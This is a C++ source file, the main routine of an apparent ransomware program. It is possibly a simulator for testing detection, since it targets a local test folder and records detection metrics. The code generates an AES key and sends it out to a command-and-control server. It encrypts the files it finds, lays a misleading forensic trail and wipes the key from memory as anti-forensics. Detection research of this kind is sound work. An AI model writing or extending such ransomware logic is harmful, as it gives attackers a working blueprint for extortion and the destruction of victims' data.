#include "ransomware.h"
#include <chrono>
#include <thread>

using namespace std::chrono;

int main()
{
    const string TARGET_DIR = "./test_files";
    AttackMetrics metrics;
    metrics.was_detected = false;
    metrics.files_detected_before = 0;

    auto start_time = high_resolution_clock::now();

    cout << "\n======================================" << endl;
    cout << "  RANSOMWARE ATTACK " << endl;
    cout << "======================================\n"
         << endl;

    create_forensic_misleading_trail();

    if (!fs::exists(TARGET_DIR))
    {
        fs::create_directory(TARGET_DIR);
    }

    string session_id;
    generate_session_id(session_id);
    int pid = get_process_id();

    unsigned char key[32];
    generate_aes_key(key);

    cout << "PID: " << pid << endl;
    cout << "KEY: " << bytes_to_hex(key, 8) << "..." << endl;

    log_to_c2(key, session_id, to_string(pid));
    cout << "C2: Key exfiltrated\n"
         << endl;

    vector<fs::path> files = find_target_files(TARGET_DIR);
    metrics.total_files_found = files.size();

    randomize_file_order(files);

    int encrypted = 0;
    int honeyfile_triggered = 0;

    cout << ">>> ENCRYPTING FILES <<<\n"
         << endl;

    for (const auto &file : files)
    {
        string filename = file.filename().string();

        try
        {
            string output = file.string() + ".encrypted";
            aes_encrypt_file(file.string(), output, key);
            cout << "  [OK] " << filename << endl;
            encrypted++;
            this_thread::sleep_for(chrono::milliseconds(2000));
        }
        catch (const exception &e)
        {
            cout << "  [FAIL] " << filename << endl;
        }
    }

    metrics.files_encrypted = encrypted;

    SessionInfo session;
    session.session_id = session_id;
    session.timestamp = "";
    session.process_id = to_string(pid);
    session.files_encrypted = encrypted;
    memcpy(session.key, key, 32);
    log_session_info(session);

    auto end_time = high_resolution_clock::now();
    metrics.execution_time_seconds = duration<double>(end_time - start_time).count();
    log_attack_metrics(metrics);

    cout << "\n>>> RESULTS <<<" << endl;
    cout << "  Encrypted: " << encrypted << "/" << files.size() << endl;

    cout << "\n>>> ANTI-FORENSICS <<<" << endl;
    forensic_wipe_memory(key, sizeof(key));
    cout << "  Key wiped from memory" << endl;

    cout << "\n======================================" << endl;
    cout << "  ATTACK COMPLETE" << endl;
    cout << "======================================\n"
         << endl;

    return 0;
}